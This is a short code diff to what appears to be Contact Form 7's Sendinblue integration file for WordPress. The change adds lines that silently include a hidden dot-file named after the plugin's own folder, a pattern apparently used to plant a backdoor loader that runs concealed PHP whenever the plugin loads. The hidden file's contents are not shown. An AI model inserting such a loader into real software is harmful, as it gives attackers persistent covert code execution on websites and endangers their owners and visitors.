@@ -4,6 +4,10 @@ if ( ! class_exists( 'WPCF7_Service' ) ) {
 	return;
 }
 
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 class WPCF7_Sendinblue extends WPCF7_Service {
 	use WPCF7_Sendinblue_API;
 
